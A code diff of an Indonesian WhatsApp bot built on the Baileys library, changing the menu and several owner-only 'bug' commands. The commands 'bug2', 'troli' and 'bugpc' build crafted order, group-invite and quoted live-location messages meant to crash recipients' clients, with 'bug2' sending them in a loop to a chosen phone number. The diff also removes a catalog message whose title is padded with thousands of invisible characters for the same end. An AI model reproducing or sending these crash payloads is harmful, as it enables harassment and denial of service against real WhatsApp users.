@@ -2936,7 +2936,7 @@ let locale = 'id'
 const time2 = moment.tz('Asia/Jakarta').format('HH:mm:ss')
 let date = de.toLocaleDateString(locale, {day: 'numeric', month: 'long', year: 'numeric'})
 let time1 = de.toLocaleDateString(locale, {hour: 'numeric', minute: 'numeric', second: 'numeric'})
-                main = `╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
+                cok = `╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
 ┃Lɪʙʀᴀʀʏ: Baileys-Md
 ┃Tᴀɴɢɢᴀʟ Sᴇᴠᴇʀ: ${date}
 ┃Wᴀᴋᴛᴜ Sᴇᴠᴇʀ: ${time2}
@@ -3267,7 +3267,7 @@ let time1 = de.toLocaleDateString(locale, {hour: 'numeric', minute: 'numeric', s
                                     id: 'sc'
                                 }
                             }]
-                            hisoka.send5ButLoc(m.chat, main, "@HANZ々OFC彡-[MD]", fs.readFileSync('./menu1.jpeg'), btn)
+                            hisoka.send5ButLoc(m.chat, cok, "@HANZ々OFC彡-[MD]", fs.readFileSync('./menu1.jpeg'), btn)
                      }
             break
 case 'bugv1':
@@ -3725,7 +3725,7 @@ case 'bug2': {
     let users1 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     c = fs.readFileSync('error.jpg')
     for (let i = 0; i < 10; i++){
-     hisoka.sendMessage(`${text.split("+")[1]}@s.whatsapp.net`, {text: "HANZ々OFC彡I GIVE [CRASH]"}, {quoted:troli})
+     hisoka.sendMessage(`${text.split("+")[1]}@s.whatsapp.net`, {text: "HANZ々OFC彡 I GIVE [CRASH]"}, {quoted:troli})
     await hisoka.sendImageAsSticker(`${text.split("+")[1]}@s.whatsapp.net`, c, troli, {packname: 'HANZ々OFC彡', author: 'I GIVE [CRASH]'})
         await sleep(3000 * 60)
     }
@@ -3822,15 +3822,15 @@ if(text.endsWith("@g.us")) {
 break
 case 'troli':
 	if(!isCreator) return m.reply("Khusus Owner")
-     troli = generateWAMessageFromContent(m.chat,{
+     let troli = generateWAMessageFromContent(m.chat,{
 	"orderMessage": {
 	"orderId": "1852737648397912",
 	"thumbnail": virgam,
 	"itemCount": 2023,
 	"status": "INQUIRY",
 	"surface": "CATALOG",
-	"message": `P`,
-	"orderTitle": `P`, // 
+	"message": `HANZ々OFC彡 I GIVE [CRASH]`,
+	"orderTitle": `Haris S`, // 
 	"sellerJid": "5491133536405@s.whatsapp.net",
 	"token": "AR7/2zjjptlTa5L01fa9w1r5YlEYzOfAdW75CBBiFko14g=="
 	}
@@ -3849,7 +3849,7 @@ jpegThumbnail: fs.readFileSync(`./menu1.jpeg`),
 	break
 case 'bugpc':
 if(!isCreator) return m.reply("Khusus Owner")
-main = generateWAMessageFromContent(m.chat,{
+pc = generateWAMessageFromContent(m.chat,{
 "groupInviteMessage": {
 "groupJid": "6283144394823@g.us",
 "inviteCode": "UkJdqTXupAtmDwo4",
@@ -3867,47 +3867,14 @@ main = generateWAMessageFromContent(m.chat,{
 	key : {
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
-message: {
+message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
 liveLocationMessage: {
 caption: `By: メʜᴀɴᴢ ᴏꜰᴄメ`,
 jpegThumbnail: fs.readFileSync(`./menu1.jpeg`), 
 }
 }
 }, contextInfo:{}}) 
-hisoka.relayMessage(m.chat, main.message, { messageId: main.key.id,})	
-	break
-case 'jadikatalog':
-imeg = hisoka.message.imageMessage
-let main = generateWAMessageFromContent(m.chat,{
-"productMessage": {
-"product": {
-"productImage": imeg, 
-"title": `${q}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏`,
-"description": `cok️️`,
-"currencyCode": "USD",
-"priceAmount1000": "0",
-"productImageCount": 1,
-"firstImageId": 1,
-"contentText": `p cok`,           
-"footerText": `P cok`,
-"salePriceAmount1000": "99.99999999999999999999",         
-"retailerId": `KATALOG NEW ERA`,
-"url": "Haris Ganteng"                       
-},
-"businessOwnerJid": "6283144394823@s.whatsapp.net",
-}
-}, { quoted: {
-	key : {
-participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
-},
-message: {
-liveLocationMessage: {
-caption: `By: メʜᴀɴᴢ ᴏꜰᴄメ`,
-jpegThumbnail: fs.readFileSync(`./menu1.jpeg`), 
-}
-}
-}, contextInfo:{}}) 
-hisoka.relayMessage(m.chat, main.message, { messageId: main.key.id,})	
+hisoka.relayMessage(m.chat, pc.message, { messageId: pc.key.id,})	
 	break
             default:
                 if (budy.startsWith('=>')) {
